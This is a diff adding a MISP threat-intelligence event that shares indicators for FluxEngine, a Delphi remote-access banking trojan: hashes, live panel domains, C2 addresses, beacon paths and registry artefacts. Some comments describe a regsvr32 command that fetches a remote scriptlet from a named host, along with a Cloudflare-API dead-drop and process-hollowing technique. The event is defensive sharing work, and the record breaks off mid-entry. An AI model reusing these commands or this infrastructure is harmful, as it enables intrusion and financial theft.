@@ -1,0 +1,747 @@
+{
+  "Event": {
+    "uuid": "e2832a5b-a4c2-5389-9b2b-b33c4dec6c62",
+    "info": "FluxEngine, a live Delphi remote-access banker (panel remoto.painelst.com, Cloudflare-API TXT dead drop)",
+    "date": "2026-11-19",
+    "threat_level_id": "2",
+    "analysis": "2",
+    "distribution": "3",
+    "published": false,
+    "timestamp": "1795046400",
+    "Orgc": {
+      "uuid": "b641827b-b56f-53c3-b356-359fddd6e73f",
+      "name": "Harper Johns"
+    },
+    "Tag": [
+      {
+        "name": "tlp:clear"
+      }
+    ],
+    "Attribute": [
+      {
+        "uuid": "1db3c71b-c959-5525-9319-0dd4f330d3df",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "c424a715e3861bc18e0c8223f3dfd909dc4a77a82b9c5a5a135b8d49bac7e8c6",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "FluxEngine client (payload): Delphi PE32 GUI, 4,540,928 B, compiled 2026-11-17 00:02:55 UTC, version info poses as Microsoft Edge. The delivered binary, i.e. the plaintext of d3dx9_43.bin after the loader's own AES-256 decryption, reproduced from two separate downloads. MD5 18a54b1573f23ccfb996536fb3e8d1f9, SHA-1 1c6e5656d306c700503b0ec4ec3486719c79237e [type: sha256; verdict: malicious; source: static analysis and decryption (this case); ThreatFox 2034982; MalwareBazaar; VirusTotal]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "e905c55e-5c10-5648-9aa4-d6b7ce02da57",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "dc60f22fc59a7c3cb51b97661ad69f42d3028538c0044b248fc9681487c0b433",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "FluxEngine loader dhlib.dll (Delphi DLL, export InitModule), compiled 2026-10-19, verbose Portuguese debug strings, 1,844,496 B; VT 2026-11-19: Kaspersky HEUR:Trojan-Spy.Win32.FluxBanker.gen, ESET Win32/Delf_AGen.AGO. Same download/decrypt/hollow logic and the same embedded master key in all four builds [type: sha256; verdict: malicious; source: static analysis (this case); ThreatFox 2034978; MalwareBazaar; VirusTotal]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "0763e10f-6b29-555c-9719-ecdd3d5105b5",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "6a9ded132c050747ae5f233a91fc84c6bbee4e91950636f5fe077bf48acdca30",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "FluxEngine loader dhlib.dll (Delphi DLL, export InitModule), Sep 2026 build, 1,824,768 B; VT: Kaspersky FluxBanker.gen, ESET Win32/Delf.VES. Same download/decrypt/hollow logic and the same embedded master key in all four builds [type: sha256; verdict: malicious; source: static analysis (this case); ThreatFox 2034979; MalwareBazaar; VirusTotal]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "b6507f6d-147c-536e-bca9-673e73f74974",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "7040370d8d09dc735d3ae9a77fe4b4c8e3f97c64efb60d4a962337fd6b16b114",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "FluxEngine loader dhlib.dll (Delphi DLL, export InitModule), Sep 2026 build, 1,834,256 B; VT: Kaspersky FluxBanker.gen, ESET Win32/Delf.VES. Same download/decrypt/hollow logic and the same embedded master key in all four builds [type: sha256; verdict: malicious; source: static analysis (this case); ThreatFox 2034980; MalwareBazaar; VirusTotal]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "be5064b7-72c6-53ae-8704-bd687e65f487",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "01af2f7049e1562023835ddcbffea76e265ed2906e140ba8a200eb41d37ebf8d",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "FluxEngine loader dhlib.dll (Delphi DLL, export InitModule), Sep 2026 build, 1,824,768 B; VT: 23 detections, no Kaspersky or ESET detection. Same download/decrypt/hollow logic and the same embedded master key in all four builds [type: sha256; verdict: malicious; source: static analysis (this case); ThreatFox 2034981; MalwareBazaar; VirusTotal]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "6aacf427-f851-5a6c-98cd-e597f8ed0215",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "6e6d4084c6c2f3035c2fbda4daf4b705a06938d73bf91f402552b6d4ab522d9b",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Stage-1 LNK (2,171 B): cmd /V:ON, copies scrobj.dll into an alternate data stream of a %TEMP% .log, then regsvr32 /i:<url> /u /s on the stream (Squiblydoo). Read from the bytes. Link to the FluxEngine loader is by shared infrastructure only (not hash-proven); the scriptlet it fetches was not obtained [type: sha256; verdict: malicious; source: static analysis (this case); MalwareBazaar; ThreatFox 2034984]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "219580da-728e-5c52-ac10-92ff3c56fdf7",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "d88135613cd2cd09dbb6646d9e4a18b968cfb39a3ac5769dca751af7687bff41",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Previous FluxEngine client build (7hfobg.exe, 4,540,416 B, compile 2026-11-10). Known only from VirusTotal data (bytes not in hand): same registry key, mutex and Cloudflare-API lookups in the 2026-11-12 sandbox run; VT: Kaspersky HEUR:Trojan-Banker.Win32.Agent.gen, ESET Win32/Spy.Delf.RCE [type: sha256; verdict: malicious; source: VirusTotal behaviour and file report; ThreatFox 2034983]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "9c42ba01-1d99-544a-b0cf-55e64c63350e",
+        "type": "domain",
+        "category": "Network activity",
+        "value": "remoto.painelst.com",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "FluxEngine operator panel ('Operador - Login'), UrlSource and payload host: /api/source-file.php returns the encrypted payload container, /template/source/<id>/<lang> the mail template, /registrar.php the victim beacon. A record 72.167.150.114 (DoH 2026-11-19). HTTP 200 in urlscan scans on 2026-11-02, 11-10, 11-11, 11-17 [type: domain; verdict: malicious; source: urlscan; payload retrieved twice through an anonymising network; VirusTotal behaviour; ThreatFox 2034971]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "eb273f25-a115-5b67-ab8c-46d7c220b715",
+        "type": "domain",
+        "category": "Network activity",
+        "value": "painelst.com",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Registrable domain of the panel: registered 2026-08-27 (Dynadot), Cloudflare name servers. ip.painelst.com is only a Cloudflare-proxied address with no TXT record, i.e. not the dead-drop zone [type: domain; verdict: malicious; source: RDAP; DoH (2026-11-19)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "1bfc3415-30f3-5320-9786-f1c872858518",
+        "type": "domain",
+        "category": "Network activity",
+        "value": "taguje.com.br",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Zone name used as the Cloudflare-API dead drop in the VirusTotal sandbox run of 2026-11-12 (TXT ip.<zone> = C2 IP, TXT lurlsource.<zone> = UrlSource). A lookup key inside a Cloudflare account, not a contacted host; NXDOMAIN in public DNS and RDAP 404 on 2026-11-19, so the dead drop works without public DNS [type: domain; verdict: malicious; source: VirusTotal behaviour; DoH/RDAP; ThreatFox 2034976]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "abbfc66e-4a0a-58aa-9223-ad1a8eee1dda",
+        "type": "domain",
+        "category": "Network activity",
+        "value": "nota-fical-online.lat",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Stage host in the lure LNK: regsvr32 /i:https://nota-fical-online.lat/d/<id> scriptlet URL. Read from the LNK bytes; NXDOMAIN on 2026-11-19, scriptlet not obtained. Link to the FluxEngine loader is by shared infrastructure only [type: domain; verdict: malicious; source: static analysis (this case); ThreatFox 2034977]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "2ef9955a-5ccb-5bd9-ba2c-d01182f69ec6",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "72.167.150.114",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Panel origin since 2026-11-17 (GoDaddy, AS398101). TCP 443, 22, 9000 and 9002 open on 2026-11-19 from 10 third-party check-host nodes; 9001 and 31337 refused. Never contacted by us [type: ipv4; verdict: malicious; source: DoH; urlscan; check-host (bare TCP via third-party nodes)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "d658c257-4b89-5425-8477-a6caa5e35555",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "72.167.47.112",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Earlier panel origin (moved to 72.167.150.114 between 2026-11-13 and 2026-11-17). Opened by the previous payload build on TCP 9000 in the VirusTotal sandbox run of 2026-11-12. Passive evidence only, liveness not checked [type: ipv4; verdict: malicious; source: VirusTotal behaviour]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "445f718d-1916-55a2-8659-4881129d384f",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "156.73.57.2",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Also contacted on TCP 9000 in the same VirusTotal sandbox run. Role unverified (second C2 or an unrelated host): context, not submitted to ThreatFox [type: ipv4; verdict: candidate; source: VirusTotal behaviour]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"low\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "7c5ce386-964f-53ef-a7b3-c0117d61b910",
+        "type": "ip-dst|port",
+        "category": "Network activity",
+        "value": "72.167.150.114|9000",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "FluxEngine control channel (JSON events, PING/PONG). The client reads the C2 IP from a DNS TXT record, so the IP is not embedded; the panel host listens here (check-host 2026-11-19) [type: endpoint; verdict: malicious; source: static analysis + check-host; ThreatFox 2034973]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "4ada8d82-1797-5008-9127-ad064979e669",
+        "type": "ip-dst|port",
+        "category": "Network activity",
+        "value": "72.167.150.114|9002",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "FluxEngine data and video channel (H.264 via Media Foundation, or JPEG) [type: endpoint; verdict: malicious; source: static analysis + check-host; ThreatFox 2034974]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "72815daa-4dc5-5ee0-9011-133136cf41b3",
+        "type": "ip-dst|port",
+        "category": "Network activity",
+        "value": "72.167.47.112|9000",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Previous C2 endpoint of the 2026-11-12 build (see 72.167.47.112) [type: endpoint; verdict: malicious; source: VirusTotal behaviour; ThreatFox 2034975]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "c4d9dab5-177e-5451-9176-3ba0e84d905f",
+        "type": "ip-dst|port",
+        "category": "Network activity",
+        "value": "156.73.57.2|9000",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Seen in the same sandbox run, role unverified [type: endpoint; verdict: candidate; source: VirusTotal behaviour]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"low\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "31a36a30-55ab-5b45-90ff-9181215d3752",
+        "type": "url",
+        "category": "Network activity",
+        "value": "https://remoto.painelst.com/api/source-file.php?f=d3dx9_43.bin",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Encrypted payload container. The panel re-encrypts it per download (fresh session key and IV), so container hashes are worthless as indicators; two downloads decrypt to the same payload c424a715...e8c6 [type: url; verdict: malicious; source: payload retrieved twice through an anonymising network; ThreatFox 2034972]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "3c7a4c32-26a3-5d71-8ac0-5116154c721a",
+        "type": "url",
+        "category": "Network activity",
+        "value": "https://remoto.painelst.com/template/source/3A14/en-us",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Mail template fetched by the payload for the Outlook/Thunderbird contact resend; id 3A14 in two payload builds [type: url; verdict: malicious; source: static analysis; VirusTotal behaviour]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "3cb3aea8-5159-5f9c-aab8-210ae6d8ad0c",
+        "type": "uri",
+        "category": "Network activity",
+        "value": "/api/source-file.php?f=",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "UrlSource download path of loader modules (turbojpeg.dll, d3dx9_43.bin), requested with UA Mozilla/5.0 by the loader [type: url-path; verdict: malicious; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "e02abb61-261a-5f19-8489-953a5db01209",
+        "type": "uri",
+        "category": "Network activity",
+        "value": "/api/upload-source.php?action=list",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Module list request of the loader (JSON success/versao/arquivos); not requested by us [type: url-path; verdict: malicious; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "1545ccc2-73b6-5600-b32c-cd4abff7f4b5",
+        "type": "uri",
+        "category": "Network activity",
+        "value": "/template/source/",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Mail-template path of the payload (/template/source/<id>/<lang>) [type: url-path; verdict: malicious; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "ae3c2c05-2898-5122-9248-ff5d05e194a2",
+        "type": "uri",
+        "category": "Network activity",
+        "value": "/api/reenvio/log",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Resend log POST of the contact-resend module [type: url-path; verdict: malicious; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "81c07fef-8390-5aa1-8b88-3195a77dc579",
+        "type": "uri",
+        "category": "Network activity",
+        "value": "/registrar.php?acao=log&status=",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Victim beacon of loader and payload: status=<installed|...>&pc=<COMPUTERNAME>&user=<USERNAME>[&motivo=dll_vm|dll_sandbox|dll_erro_modulos|dll_erro_injecao] [type: url-path; verdict: malicious; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "1bb81b7c-ed59-5ba3-8967-c01b73ecb30b",
+        "type": "text",
+        "category": "Other",
+        "value": "raw.githubusercontent.com/<gh_owner>/<gh_repo>/<branch>/<id>.html fetched by a Delphi process",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Encrypted overlay HTML pulled from GitHub; owner, repository and token are pushed by the C2 at run time, so the repository is not known statically (not published). Hunt on the pattern, never block the host [type: behaviour; verdict: hunting-pivot; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "59e00dab-c67c-504c-a98f-ea2033c330bb",
+        "type": "text",
+        "category": "Other",
+        "value": "api.cloudflare.com /client/v4/zones?per_page=1000 and /zones/<id>/dns_records?type=TXT&name=<ip|lurlsource>.<zone>",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Dead drop: legitimate Cloudflare API used from a non-browser Delphi process with an embedded Bearer token (not published). Hunt on the process and the two lookups, never block api.cloudflare.com [type: behaviour; verdict: hunting-pivot; source: static analysis; VirusTotal behaviour]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "ec40fc6c-ba3b-5143-996e-00c673dba3f7",
+        "type": "user-agent",
+        "category": "Network activity",
+        "value": "Embarcadero URI Client/1.0",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Default Delphi THTTPClient user agent seen on the Cloudflare API calls in the sandbox run; generic, hunting pivot only [type: user-agent; verdict: hunting-pivot; source: VirusTotal behaviour]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"low\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "5caf64c7-28a1-52da-aa5b-329d431d473c",
+        "type": "text",
+        "category": "Other",
+        "value": "{\"action\":\"evento\",\"tipo\":\"dbg\",\"msg\":",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "JSON event framing on the TCP 9000 control channel [type: string; verdict: malicious; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "4006c8f5-c66e-5da6-9dea-ff22c877ea8b",
+        "type": "text",
+        "category": "Other",
+        "value": "HKCU\\Software\\FluxEngine\\Desktop",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Internal family name. Loader value 'src' (UrlSource override); payload values pd_*/pe_* (PROTEGER_CASA domain lists) and state [type: registry-key; verdict: malicious; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "b61d5935-f3bb-5f4a-8c05-63a6366e28a8",
+        "type": "text",
+        "category": "Other",
+        "value": "HKCU\\Software\\HWiNFO32\\Sens (value bsource)",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Cached UrlSource, masquerades as HWiNFO [type: registry-key; verdict: malicious; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "48b105b6-5e1c-5c23-9c31-3b7c07afbf1a",
+        "type": "text",
+        "category": "Other",
+        "value": "HKCU\\Software\\Classes\\AppUserModelId\\KLRemota.Cliente.Notify.v2",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Toast-notification identity of the payload (KL Remota naming) [type: registry-key; verdict: malicious; source: static analysis; VirusTotal behaviour]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "39861ee7-5118-51f5-b79e-c38e2e2c575a",
+        "type": "text",
+        "category": "Other",
+        "value": "HKCU\\Software\\mchrome; HKCU\\Software\\MozillaTracker",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Payload state keys; purpose not fully traced [type: registry-key; verdict: malicious; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "8b14b9f3-1bd4-57f6-a7d4-02d6059ad875",
+        "type": "text",
+        "category": "Other",
+        "value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (value: 8 lowercase letters)",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Loader persistence: value named from COMPUTERNAME+USERNAME, data '\"C:\\<n>\\<n>.exe C:\\<n>\\\"'. Only written if that EXE already exists; the host EXE is not in hand [type: registry-key; verdict: hunting-pivot; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "ead28598-5ec0-5931-857c-5cc60aaafb2a",
+        "type": "mutex",
+        "category": "Artifacts dropped",
+        "value": "Global\\misge_single_instance_7F3A",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "Payload single-instance mutex (project name 'misge'); seen in the VirusTotal sandbox run, not read from the code [type: mutex; verdict: malicious; source: VirusTotal behaviour]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "aabb9824-bc7f-58ba-9156-ba1a046c8cb8",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "value": "%SystemRoot%\\System32\\attrib.exe (suspended, then hollowed; env HOLLOW_DIR=<BaseDir>)",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Payload host process: a suspended attrib.exe that later talks to the network, with a regsvr32 or loader-host parent. attrib.exe itself is genuine: never block it [type: process; verdict: hunting-pivot; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "91a57997-e1fa-50a6-88e3-24676f018463",
+        "type": "filename",
+        "category": "Artifacts dropped",
+        "value": "%TEMP%\\kl_winrt_toast.ps1",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "PowerShell WinRT helper for fake Windows toasts (path inferred from strings); kl_toast_icon.png next to it [type: file-path; verdict: malicious; source: static analysis (this case)]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "06674291-844b-5650-b1d2-93697674c32e",
+        "type": "filename",
+        "category": "Artifacts dropped",
+        "value": "<BaseDir>\\turbojpeg.dll",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Genuine libjpeg-turbo fetched from the panel for JPEG streaming: benign alone, context only, do NOT block on it [type: file-path; verdict: shared-or-legit-infrastructure; source: static analysis; payload retrieval]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "1aa11a27-3deb-51c8-81db-0db7f397116a",
+        "type": "text",
+        "category": "Other",
+        "value": "c7a5c88f8fac531f9ebc94c3c2a38850",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Imphash of the dhlib.dll loader builds (18 on VirusTotal per the hunt); hunting pivot [type: imphash; verdict: hunting-pivot; source: pefile]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "adf70956-d05c-54dc-88c6-2b8e03a3cbe7",
+        "type": "text",
+        "category": "Other",
+        "value": "1869a844633307e61fc269733d519af2",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Imphash of the payload c424a715 [type: imphash; verdict: hunting-pivot; source: pefile]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "9faf04f7-664a-5f5c-966e-5162041c20a6",
+        "type": "link",
+        "category": "External analysis",
+        "value": "https://www.proofpoint.com/uk/blog/threat-insight/europes-threat-landscape-2026-espionage-expands-ai-and-phishing-risks-grow",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "Proofpoint: names 'a newly observed payload identified as FluxEngine RAT' in the core malware of TA2725; no IOCs or code details published [type: reference; verdict: reference]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "7e0778fc-0cd9-59ed-9a87-82e7c5cab92e",
+        "type": "link",
+        "category": "External analysis",
+        "value": "https://threatfox.abuse.ch/ioc/2034971/",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "ThreatFox entries 2034971 to 2034984 (this case, malware label Unknown RAT) [type: reference; verdict: reference]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "b29ceb34-1093-580b-9b03-d1d69d701717",
+        "type": "link",
+        "category": "External analysis",
+        "value": "https://bazaar.abuse.ch/sample/c424a715e3861bc18e0c8223f3dfd909dc4a77a82b9c5a5a135b8d49bac7e8c6/",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "MalwareBazaar: decrypted FluxEngine payload [type: reference; verdict: reference]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "23a019e5-94be-536a-8396-8df2d9fd0ef3",
+        "type": "link",
+        "category": "External analysis",
+        "value": "https://www.virustotal.com/gui/file/c424a715e3861bc18e0c8223f3dfd909dc4a77a82b9c5a5a135b8d49bac7e8c6",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "VirusTotal: decrypted FluxEngine payload (uploaded 2026-11-19) [type: reference; verdict: reference]",
+        "timestamp": "1795046400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-19T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "0a0d6227-c19f-5cfa-859d-59beaec7d933",
+        "type": "link",
+        "category": "External analysis",
+        "value": "https://gist.github.com/harperjohnsai/7a54b1ff73b0b42f3cdc5d25fe5c4c3f",
+        "to_ids": false,
+        "distribution": "5",
